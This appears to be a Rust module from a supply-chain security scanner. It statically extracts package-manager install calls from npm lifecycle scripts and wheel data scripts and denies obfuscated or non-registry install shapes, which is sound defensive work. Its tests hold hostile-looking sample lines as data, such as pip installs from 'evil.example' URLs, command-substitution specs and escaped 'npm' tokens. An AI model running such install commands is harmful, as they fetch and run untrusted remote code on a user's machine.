//! Static extraction of install references: package-manager invocations
//! inside a reviewed payload that resolve ANOTHER install on the victim
//! machine at install/build time (the TanStack `optionalDependencies →
//! github:orphan-commit → prepare` and Atomic Arch `npm install
//! atomic-lockfile` lane). Pure scanning of already-extracted bytes —
//! nothing here executes, fetches, or resolves anything.
//!
//! Best-effort by nature: obfuscated invocations (`\npm`, `env npm`,
//! indirection through variables the scanner cannot resolve) are layered
//! under the existing diff/PKGBUILD heuristic rules, not replaced by this
//! scanner. Everything the scanner CAN see statically, it must surface —
//! including invocations whose target is dynamic, which are disclosed as
//! unparseable references rather than skipped or guessed.

use std::path::Path;

use crate::version::VersionInfo;

use crate::diff::Delta;
use crate::manifest::PackageJson;

const MAX_SCAN_LINE_BYTES: usize = 4096;

/// Flags that swallow the following token as their value; without this the
/// value would misread as a package spec (`npm install --registry
/// https://x evil` must yield exactly `evil`).
const CONSUME_VALUE_FLAGS: &[&str] = &[
    "-r",
    "--requirement",
    "-c",
    "--constraint",
    "-e",
    "--editable",
    "-t",
    "--target",
    "--prefix",
    "--registry",
    "--cache",
    "--tag",
    "--userconfig",
    "--globalconfig",
    "--proxy",
    "--https-proxy",
];

/// A package manager whose invocation was found inside a reviewed payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RefManager {
    Npm,
    Npx,
    Pnpm,
    Yarn,
    Bun,
    Bunx,
    Pip,
    Cargo,
    Yay,
    Paru,
}

impl RefManager {
    pub fn label(&self) -> &'static str {
        match self {
            RefManager::Npm => "npm",
            RefManager::Npx => "npx",
            RefManager::Pnpm => "pnpm",
            RefManager::Yarn => "yarn",
            RefManager::Bun => "bun",
            RefManager::Bunx => "bunx",
            RefManager::Pip => "pip",
            RefManager::Cargo => "cargo",
            RefManager::Yay => "yay",
            RefManager::Paru => "paru",
        }
    }
}

/// Where in the reviewed payload the reference was found.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RefOrigin {
    NpmLifecycle { script: String },
    Pkgbuild { function: String },
    WheelDataScript { path: String },
    CommandLine,
}

/// One machine-resolved install reference. `pinned` means the spec carries
/// an exact version; `parseable` is false when the spec is dynamic
/// (shell expansion, wildcards, metacharacters) or the invocation's target
/// could not be read at all (oversized line, unreadable file) — the
/// reference exists but its target cannot be resolved statically, which
/// downstream review treats as its own finding, never as a guess.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstallRef {
    pub origin: RefOrigin,
    pub manager: RefManager,
    pub spec: String,
    pub pinned: bool,
    pub parseable: bool,
}

impl InstallRef {
    /// Registry-installable spec (`name`, `name@version`, `name==version`,
    /// scoped npm names). Anything else — git/URL specs, dynamic payloads —
    /// is surfaced but not recursively resolvable.
    pub fn registry_spec(&self) -> Option<(&str, Option<&str>)> {
        if !self.parseable || self.spec.is_empty() {
            return None;
        }
        let (name, version) = split_spec(self.manager, &self.spec)?;
        match self.manager {
            RefManager::Pip if valid_py_name(name) => Some((name, version)),
            RefManager::Pip => None,
            RefManager::Yay | RefManager::Paru if valid_aur_name(name) => Some((name, version)),
            RefManager::Yay | RefManager::Paru => None,
            _ if valid_npm_name(name) => Some((name, version)),
            _ => None,
        }
    }
}

/// Split `name==version` (pip) or `name@version` (npm-like) into parts.
/// A bare scoped name (`@scope/pkg`) is a name with no version; an empty
/// version part (`pkg@`, `requests==`) reads as unpinned, not broken.
fn split_spec(manager: RefManager, spec: &str) -> Option<(&str, Option<&str>)> {
    match manager {
        RefManager::Yay | RefManager::Paru => match spec.split_once('=') {
            Some((n, v)) if !n.is_empty() && !v.is_empty() => Some((n, Some(v))),
            Some(_) => Some((spec, None)),
            None => Some((spec, None)),
        },
        RefManager::Pip => match spec.split_once("==") {
            Some((n, v)) if !v.is_empty() => Some((n, Some(v))),
            Some((n, _)) => Some((n, None)),
            None => Some((spec, None)),
        },
        _ => match spec.rsplit_once('@') {
            Some((n, v)) if !n.is_empty() && !n.ends_with('@') && !v.is_empty() => {
                Some((n, Some(v)))
            }
            Some((n, _)) if !n.is_empty() => Some((n, None)),
            _ => Some((spec, None)),
        },
    }
}

fn valid_npm_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    let body = name.strip_prefix('@').unwrap_or(name);
    let Some((scope, pkg)) = body.split_once('/') else {
        return plain_npm_segment(name);
    };
    if name.strip_prefix('@').is_none() || scope.is_empty() || pkg.is_empty() {
        return false;
    }
    plain_npm_segment(scope) && plain_npm_segment(pkg)
}

/// Mirrors the npm registry's own `is_valid_name_segment`: no leading `.`
/// or `_`, never `.` or `..`, lowercase letters/digits/`-`/`_`/`.` only.
/// A name this scanner accepts must be a name the registry would too, so
/// a crafted reference can never smuggle a path segment past review.
fn plain_npm_segment(seg: &str) -> bool {
    !seg.is_empty()
        && seg != "."
        && seg != ".."
        && !seg.starts_with('.')
        && !seg.starts_with('_')
        && seg
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '-' | '_' | '.'))
}

/// AUR pkgbase grammar: printable ASCII name characters, no separators.
fn valid_aur_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 255
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-' | '@'))
}

fn valid_py_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 214
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// Shell syntax that makes the following token a dynamic payload rather
/// than a statically resolvable spec.
fn has_dynamic_syntax(token: &str) -> bool {
    token.chars().any(|c| {
        matches!(
            c,
            '$' | '`'
                | '('
                | ')'
                | '{'
                | '}'
                | '<'
                | '>'
                | '*'
                | '?'
                | '['
                | ']'
                | '~'
                | '"'
                | '\''
                | '\\'
                | '!'
        )
    })
}

fn version_is_exact(manager: RefManager, version: &str) -> bool {
    if version.is_empty() {
        return false;
    }
    match manager {
        RefManager::Pip => version.chars().next().is_some_and(|c| c.is_ascii_digit()),
        RefManager::Yay | RefManager::Paru => {
            crate::version::AurVersionInfo::parse(version).is_ok()
        }
        _ => semver::Version::parse(version).is_ok(),
    }
}

/// Build a reference from a raw spec token captured by a scanner. A spec
/// carrying dynamic shell syntax (or empty) is recorded unparseable —
/// disclosed downstream as its own finding, never guessed at.
pub fn raw_ref(origin: RefOrigin, manager: RefManager, spec: &str) -> InstallRef {
    if spec.is_empty() || has_dynamic_syntax(spec) {
        return InstallRef {
            origin,
            manager,
            spec: String::new(),
            pinned: false,
            parseable: false,
        };
    }
    let pinned = split_spec(manager, spec)
        .and_then(|(_, v)| v)
        .map(|v| version_is_exact(manager, v))
        .unwrap_or(false);
    InstallRef {
        origin,
        manager,
        spec: spec.to_string(),
        pinned,
        parseable: true,
    }
}

/// One whitespace-separated word, lowercased for matching and kept raw for
/// spec capture. Trailing `;`/`&`/`|` belong to shell grammar, not the
/// token: they end the command and are stripped from the word. A word that
/// is ONLY shell grammar (`&&`, `|`, `;`) is a separator.
struct Tok {
    lower: String,
    raw: String,
    ends_command: bool,
    is_separator: bool,
}

fn strip_token(word: &str) -> (String, bool, bool) {
    let core = word.trim_end_matches([';', '&', '|']);
    let ends_command = core.len() != word.len();
    let core = core.trim_end_matches(',').to_string();
    let is_separator = core.is_empty() && ends_command;
    (core, ends_command, is_separator)
}

/// Scan one line of shell-like text for package-manager invocations.
/// Matching is case-insensitive; specs are captured from the raw casing.
/// Returns (manager, spec) pairs; an empty spec string marks an invocation
/// whose target is dynamic/unparseable. Only invocations naming a target
/// are reported — a bare `npm install` resolves the manifest's own declared
/// dependencies, which the R04 dependency rules already review.
pub fn scan_line(line: &str) -> Vec<(RefManager, String)> {
    let lower = line.to_lowercase();
    let lower_words: Vec<&str> = lower.split_whitespace().collect();
    let raw_words: Vec<&str> = line.split_whitespace().collect();
    // Lowercasing can change word count for exotic unicode; fall back to
    // lowercased specs rather than indexing raw words out of alignment.
    let toks: Vec<Tok> = lower_words
        .iter()
        .enumerate()
        .map(|(i, lw)| {
            let raw = if raw_words.len() == lower_words.len() {
                raw_words[i]
            } else {
                lw
            };
            let (lower, ends_command, is_separator) = strip_token(lw);
            let (raw, _, _) = strip_token(raw);
            Tok {
                lower,
                raw,
                ends_command,
                is_separator,
            }
        })
        .collect();
    scan_words(&toks)
}

fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
    let mut refs = Vec::new();
    for i in 0..toks.len() {
        let manager = match toks[i].lower.as_str() {
            "npm" => RefManager::Npm,
            "npx" => RefManager::Npx,
            "pnpm" => RefManager::Pnpm,
            "yarn" => RefManager::Yarn,
            "bun" => RefManager::Bun,
            "bunx" => RefManager::Bunx,
            "pip" | "pip3" => RefManager::Pip,
            "cargo" => RefManager::Cargo,
            "yay" => RefManager::Yay,
            "paru" => RefManager::Paru,
            _ => continue,
        };
        if toks[i].ends_command || toks[i].is_separator {
            continue;
        }
        let verb = toks.get(i + 1);
        let starts_command = match (manager, verb.map(|t| t.lower.as_str())) {
            (RefManager::Npx, _) | (RefManager::Bunx, _) => Some(i + 1),
            // `npm exec <pkg>` / `npm x <pkg>` / `bun x <pkg>` run a package
            // exactly like npx does.
            (RefManager::Npm, Some("exec" | "x")) | (RefManager::Bun, Some("x")) => Some(i + 2),
            (RefManager::Pip, Some("install" | "i")) => Some(i + 2),
            (RefManager::Pnpm, Some("dlx")) | (RefManager::Yarn, Some("dlx")) => Some(i + 2),
            (RefManager::Cargo, Some("install")) => Some(i + 2),
            (
                RefManager::Npm | RefManager::Pnpm | RefManager::Yarn | RefManager::Bun,
                Some("install" | "i" | "add"),
            ) => Some(i + 2),
            // yay/paru -S: the verb is a flag; combined forms (-Syu) count.
            (RefManager::Yay | RefManager::Paru, Some(v)) if v.starts_with("-s") => Some(i + 2),
            _ => None,
        };
        let Some(start) = starts_command else {
            continue;
        };
        if verb.is_some_and(|t| t.ends_command) {
            continue;
        }
        // npx/bunx run ONE package; the remaining tokens are its args.
        let take_all = !matches!(manager, RefManager::Npx | RefManager::Bunx);
        let mut specs = positionals(&toks[start..], manager, take_all);
        if take_all {
            refs.extend(specs.drain(..).map(|s| (manager, s)));
        } else if let Some(s) = specs.into_iter().next() {
            refs.push((manager, s));
        }
    }
    refs
}

/// Positional package specs after a manager verb. `take_all` collects
/// every spec an install-style verb names (`npm install a b`); otherwise
/// only the first is taken. Token handling: flags are skipped (value-
/// consuming flags also skip their value), a shell separator or
/// command-ending token ends the scan, a dynamic token yields the
/// empty-string marker, a plausible package spec is captured, and
/// flag-value noise that is neither dynamic nor a plausible spec is
/// dropped.
/// npx/npm-exec style flags that NAME the package to run.
const PACKAGE_NAMING_FLAGS: [&str; 2] = ["--package", "-p"];

fn positionals(toks: &[Tok], manager: RefManager, take_all: bool) -> Vec<String> {
    let mut specs = Vec::new();
    let mut skip_value = false;
    for t in toks {
        if skip_value {
            skip_value = false;
            continue;
        }
        if t.is_separator {
            break;
        }
        if t.lower.is_empty() {
            continue;
        }
        if t.lower.starts_with('-') {
            if manager == RefManager::Npx || manager == RefManager::Bunx {
                let lower = t.lower.as_str();
                if let Some(value) = PACKAGE_NAMING_FLAGS
                    .iter()
                    .find_map(|f| lower.strip_prefix(&format!("{f}=")))
                {
                    specs.push(value.to_string());
                    if !take_all {
                        break;
                    }
                    continue;
                }
                if PACKAGE_NAMING_FLAGS.contains(&lower) {
                    skip_value = true;
                    continue;
                }
            }
            if CONSUME_VALUE_FLAGS.contains(&t.lower.as_str()) {
                skip_value = true;
            }
        } else if has_dynamic_syntax(&t.raw) {
            // One unparseable marker per invocation, even when the hostile
            // line carries several dynamic tokens back to back.
            if specs.last().map(String::is_empty) != Some(true) {
                specs.push(String::new());
            }
        } else if non_registry_spec(&t.raw) {
            // git:/URL/path specs are real references (the TanStack lane):
            // captured so the review can disclose them as unresolvable to
            // any registry, never silently dropped as flag-value noise.
            specs.push(t.raw.clone());
        } else if plausible_spec(manager, &t.raw) {
            specs.push(t.raw.clone());
        }
        if specs.len() == if take_all { usize::MAX } else { 1 } || t.ends_command {
            break;
        }
    }
    specs
}

fn plausible_spec(manager: RefManager, token: &str) -> bool {
    let name = split_spec(manager, token).map(|(n, _)| n).unwrap_or(token);
    match manager {
        RefManager::Pip => valid_py_name(name),
        _ => valid_npm_name(name),
    }
}

/// A parseable token that names a NON-registry source: git specs, URLs,
/// local paths, tarballs. These are real install references whose payload
/// no registry can vouch for.
fn non_registry_spec(token: &str) -> bool {
    token.contains("://")
        || token.starts_with("git+")
        || token.starts_with("git@")
        || token.starts_with("github:")
        || token.starts_with("gitlab:")
        || token.starts_with("bitbucket:")
        || token.starts_with("./")
        || token.starts_with("../")
        || token.starts_with('/')
        || token.ends_with(".tgz")
        || token.ends_with(".tar.gz")
}

/// Install references inside an npm package's lifecycle scripts. Only the
/// scripts that run during a plain `npm install` are scanned — a reference
/// in `test` or `lint` never executes on the install line. An oversized
/// line is disclosed as an unparseable reference, never skipped silently.
pub fn from_npm_lifecycle(manifest: &PackageJson) -> Vec<InstallRef> {
    let mut refs = Vec::new();
    for script_name in manifest.lifecycle_scripts() {
        let Some(body) = manifest.scripts.get(&script_name) else {
            continue;
        };
        for line in body.lines() {
            let origin = RefOrigin::NpmLifecycle {
                script: script_name.clone(),
            };
            refs.extend(scan_text_line(line, &origin));
        }
    }
    refs
}

/// Install references inside wheel `.data/scripts` payloads, which ship
/// onto PATH and run with the user's privileges. Scan is delta-driven and
/// bounded: only files listed in the delta under a `.data/scripts/`
/// directory. A script that cannot be read as UTF-8 is disclosed as an
/// unparseable reference rather than silently skipped.
pub fn from_wheel_data_scripts(root: &Path, delta: &Delta) -> Vec<InstallRef> {
    let mut refs = Vec::new();
    let changed = delta
        .files_added
        .iter()
        .chain(delta.files_modified.iter())
        .filter(|f| f.relative_path.contains(".data/scripts/"));
    for change in changed {
        let path = change.relative_path.clone();
        let origin = RefOrigin::WheelDataScript { path: path.clone() };
        let text = match std::fs::read_to_string(root.join(&path)) {
            Ok(t) => t,
            Err(_) => {
                refs.push(raw_ref(origin, RefManager::Pip, ""));
                continue;
            }
        };
        for line in text.lines() {
            refs.extend(scan_text_line(line, &origin));
        }
    }
    refs
}

fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
    if line.len() > MAX_SCAN_LINE_BYTES {
        // The invocation surface exists but cannot be scanned safely;
        // disclose it as unparseable instead of scanning blind or
        // skipping silently.
        return vec![raw_ref(origin.clone(), RefManager::Npm, "")];
    }
    scan_line(line)
        .into_iter()
        .map(|(manager, spec)| raw_ref(origin.clone(), manager, &spec))
        .collect()
}

/// Shapes the token scanner cannot safely resolve, surfaced for the hook
/// gate to deny: pip flags that name or redirect non-registry sources, and
/// manager tokens hidden inside quotes or shell escapes. Best-effort
/// obfuscation (obase64'd scripts, indirect exec) is NOT caught here — the
/// gate's doc says so.
pub fn gate_hard_denies(line: &str) -> Vec<String> {
    let mut denies = Vec::new();
    if let Some(detail) = pip_non_registry_shape(line) {
        denies.push(detail);
    }
    let lower_words: Vec<String> = line
        .to_lowercase()
        .split_whitespace()
        .map(|w| w.to_string())
        .collect();
    const MANAGERS: [&str; 7] = ["npm", "npx", "pnpm", "yarn", "bun", "pip", "pip3"];
    for word in &lower_words {
        let bare = word
            .trim_start_matches(['\\', '"', '\''])
            .trim_end_matches(['"', '\'']);
        if bare != word && MANAGERS.contains(&bare) {
            denies.push(format!(
                "package manager token hidden behind quoting or an escape: `{word}`"
            ));
        }
    }
    denies
}

fn pip_non_registry_shape(line: &str) -> Option<String> {
    const DANGEROUS: [&str; 8] = [
        "-r",
        "--requirement",
        "-e",
        "--editable",
        "-c",
        "--constraint",
        "--index-url",
        "--extra-index-url",
    ];
    let lower = line.to_lowercase();
    let words: Vec<&str> = lower.split_whitespace().collect();
    for i in 0..words.len() {
        if words[i] != "pip" && words[i] != "pip3" {
            continue;
        }
        for window in words[i + 1..].windows(2) {
            if window[0] == "install" || window[0] == "i" {
                if DANGEROUS.contains(&window[1]) {
                    return Some(format!(
                        "pip {flag} names or redirects non-registry sources",
                        flag = window[1]
                    ));
                }
                break;
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::PackageJson;
    use std::collections::BTreeMap;

    fn manifest_with(script: &str, body: &str) -> PackageJson {
        let mut scripts = BTreeMap::new();
        scripts.insert(script.to_string(), body.to_string());
        PackageJson {
            name: "pkg".into(),
            version: "1.0.0".into(),
            scripts,
            ..Default::default()
        }
    }

    fn npm_refs(script: &str, body: &str) -> Vec<InstallRef> {
        from_npm_lifecycle(&manifest_with(script, body))
    }

    #[test]
    fn lifecycle_postinstall_npm_install_captures_spec() {
        let refs = npm_refs(
            "postinstall",
            "node scripts/setup.js && npm install atomic-lockfile",
        );
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "atomic-lockfile");
        assert_eq!(r.manager, RefManager::Npm);
        assert!(!r.pinned);
        assert!(r.parseable);
        assert_eq!(
            r.origin,
            RefOrigin::NpmLifecycle {
                script: "postinstall".into()
            }
        );
    }

    #[test]
    fn lifecycle_pinned_scoped_spec() {
        let refs = npm_refs("preinstall", "npm install @scope/pkg@1.2.3 --save");
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "@scope/pkg@1.2.3");
        assert!(r.pinned);
        assert_eq!(r.registry_spec(), Some(("@scope/pkg", Some("1.2.3"))));
    }

    #[test]
    fn lifecycle_flags_before_spec_are_skipped() {
        let refs = npm_refs("postinstall", "npm install --save-exact left-pad@1.0.0");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "left-pad@1.0.0");
        assert!(refs[0].pinned);
    }

    #[test]
    fn lifecycle_value_flags_swallow_their_argument() {
        let refs = npm_refs(
            "postinstall",
            "npm install --registry https://registry.npmjs.org evil-pkg",
        );
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "evil-pkg");
    }

    #[test]
    fn lifecycle_every_named_spec_is_captured() {
        let refs = npm_refs("postinstall", "npm install atomic-lockfile minimist chalk");
        assert_eq!(refs.len(), 3);
        let specs: Vec<_> = refs.iter().map(|r| r.spec.as_str()).collect();
        assert_eq!(specs, ["atomic-lockfile", "minimist", "chalk"]);
    }

    #[test]
    fn lifecycle_npx_and_bunx() {
        let refs = npm_refs("prepare", "npx cypress@13.0.0 install && bunx esbuild");
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Npx);
        assert_eq!(refs[0].spec, "cypress@13.0.0");
        assert_eq!(refs[1].manager, RefManager::Bunx);
        assert_eq!(refs[1].spec, "esbuild");
    }

    #[test]
    fn lifecycle_npx_takes_only_first_positional() {
        let refs = npm_refs("postinstall", "npx cypress install --force");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "cypress");
    }

    #[test]
    fn lifecycle_bun_install_and_yarn_add() {
        let refs = npm_refs("install", "bun install js-digest; yarn add lockfile-js");
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Bun);
        assert_eq!(refs[0].spec, "js-digest");
        assert_eq!(refs[1].manager, RefManager::Yarn);
        assert_eq!(refs[1].spec, "lockfile-js");
    }

    #[test]
    fn lifecycle_dynamic_spec_is_unparseable_not_guessed() {
        let refs = npm_refs("postinstall", "npm install $(cat deps.txt)");
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "");
        assert!(!r.parseable);
        assert!(r.registry_spec().is_none());
    }

    #[test]
    fn lifecycle_bare_install_is_not_an_external_ref() {
        assert!(npm_refs("postinstall", "npm install --production").is_empty());
        assert!(npm_refs("install", "node-gyp rebuild").is_empty());
    }

    #[test]
    fn lifecycle_install_stops_at_shell_separator() {
        assert!(npm_refs("postinstall", "npm install && echo done").is_empty());
        assert!(npm_refs("postinstall", "npm install; exit 0").is_empty());
    }

    #[test]
    fn non_lifecycle_scripts_are_ignored() {
        assert!(npm_refs("test", "npm install something").is_empty());
        assert!(npm_refs("lint", "npx eslint .").is_empty());
    }

    #[test]
    fn lifecycle_invocation_is_case_insensitive() {
        let refs = npm_refs("postinstall", "NPM Install atomic-lockfile");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "atomic-lockfile");
    }

    #[test]
    fn lifecycle_oversized_line_is_disclosed_unparseable() {
        let padded = format!("{} && npm install evil", "x".repeat(4200));
        let refs = npm_refs("postinstall", &format!("npm install ok\n{padded}"));
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].spec, "ok");
        assert!(refs[0].parseable);
        assert!(!refs[1].parseable);
        assert_eq!(refs[1].spec, "");
    }

    #[test]
    fn unpinned_range_is_not_pinned() {
        let refs = npm_refs("postinstall", "npm install left-pad@^1.3.0");
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].pinned);
        assert_eq!(refs[0].registry_spec(), Some(("left-pad", Some("^1.3.0"))));
    }

    #[test]
    fn empty_version_part_reads_unpinned_not_broken() {
        let refs = npm_refs("postinstall", "npm install pkg@");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].registry_spec(), Some(("pkg", None)));
        let refs = npm_refs("postinstall", "pip install requests==");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].registry_spec(), Some(("requests", None)));
    }

    #[test]
    fn pip_install_in_wheel_data_script() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/setup-deps";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(
            dir.path().join(path),
            "#!/bin/sh\npip install requests==2.31.0\n",
        )
        .unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.manager, RefManager::Pip);
        assert_eq!(r.spec, "requests==2.31.0");
        assert!(r.pinned);
        assert_eq!(r.registry_spec(), Some(("requests", Some("2.31.0"))));
        assert_eq!(
            r.origin,
            RefOrigin::WheelDataScript {
                path: path.to_string()
            }
        );
    }

    #[test]
    fn wheel_scanner_scans_modified_files_too() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/setup-deps";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(dir.path().join(path), "pip install requests==2.31.0\n").unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_modified: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "requests==2.31.0");
    }

    #[test]
    fn pip_requirement_files_are_not_package_specs() {
        let refs = npm_refs("postinstall", "pip install -r requirements.txt");
        assert!(refs.is_empty());
        let refs = npm_refs("postinstall", "pip install -e .");
        assert!(refs.is_empty());
    }

    #[test]
    fn pip_non_digit_version_is_unpinned() {
        let refs = npm_refs("postinstall", "pip install pkg==beta1");
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].pinned);
        assert_eq!(refs[0].registry_spec(), Some(("pkg", Some("beta1"))));
    }

    #[test]
    fn unreadable_wheel_data_script_is_disclosed_unparseable() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/binary-tool";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(dir.path().join(path), [0xff, 0xfe, 0x00, 0x01]).unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].parseable);
        assert_eq!(refs[0].spec, "");
    }

    #[test]
    fn wheel_scanner_ignores_non_data_script_paths() {
        let dir = tempfile::tempdir().unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: "bin/pip-install-everything".to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        assert!(from_wheel_data_scripts(dir.path(), &delta).is_empty());
    }

    #[test]
    fn registry_spec_rejects_non_registry_shapes() {
        let mut r = InstallRef {
            origin: RefOrigin::NpmLifecycle {
                script: "postinstall".into(),
            },
            manager: RefManager::Npm,
            spec: "github:user/repo#abc".into(),
            pinned: false,
            parseable: true,
        };
        assert_eq!(r.registry_spec(), None);
        r.spec = "https://evil.example/x.tgz".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "../escape".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "UPPER/case".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@scope/pkg@1.2.3".into();
        assert_eq!(r.registry_spec(), Some(("@scope/pkg", Some("1.2.3"))));
        r.manager = RefManager::Pip;
        r.spec = "requests==2.31.0".into();
        assert_eq!(r.registry_spec(), Some(("requests", Some("2.31.0"))));
        r.spec = "my_pkg".into();
        assert_eq!(r.registry_spec(), Some(("my_pkg", None)));
    }

    #[test]
    fn gate_hard_denies_pip_non_registry_shapes() {
        let denies = gate_hard_denies("pip install -r https://evil.example/x.txt");
        assert_eq!(denies.len(), 1, "{denies:?}");
        assert!(denies[0].contains("-r"));
        assert!(gate_hard_denies("pip3 install -e git+https://x").len() == 1);
        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
        assert!(gate_hard_denies("pip install -q requests").is_empty());
    }

    #[test]
    fn gate_hard_denies_quoted_and_escaped_managers() {
        for line in [
            "\"npm\" install evil-pkg",
            "'npm' install evil-pkg",
            "\\npm install evil-pkg",
        ] {
            let denies = gate_hard_denies(line);
            assert_eq!(denies.len(), 1, "{line}: {denies:?}");
        }
        assert!(gate_hard_denies("npm install evil-pkg").is_empty());
        assert!(gate_hard_denies("echo $(date) && npm install ok-pkg").is_empty());
    }

    #[test]
    fn scanner_captures_npx_package_flag_and_exec_verbs() {
        let refs = scan_line("npx --package=evil-pkg serve");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        let refs = scan_line("npm exec evil-pkg -- --flag");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        let refs = scan_line("bun x malcontent");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "malcontent");
    }

    #[test]
    fn npm_segment_grammar_matches_registry_rules() {
        let mut r = InstallRef {
            origin: RefOrigin::NpmLifecycle {
                script: "postinstall".into(),
            },
            manager: RefManager::Npm,
            spec: String::new(),
            pinned: false,
            parseable: true,
        };
        for rejected in ["~pkg", "_pkg", ".pkg", "..", "."] {
            r.spec = rejected.to_string();
            assert_eq!(r.registry_spec(), None, "`{rejected}` must be rejected");
        }
        for accepted in ["pkg", "pkg.name", "pkg_name", "pkg-name"] {
            r.spec = accepted.to_string();
            assert_eq!(
                r.registry_spec(),
                Some((accepted, None)),
                "`{accepted}` must be accepted"
            );
        }
    }

    #[test]
    fn comma_and_semicolon_tail_is_trimmed() {
        let refs = npm_refs("postinstall", "npm install pkg,");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "pkg");
    }

    #[test]
    fn pnpm_dlx_and_pip3_shapes() {
        let refs = npm_refs(
            "postinstall",
            "pnpm dlx malcontent && pip3 install evil-pkg",
        );
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Pnpm);
        assert_eq!(refs[0].spec, "malcontent");
        assert_eq!(refs[1].manager, RefManager::Pip);
        assert_eq!(refs[1].spec, "evil-pkg");
    }
}
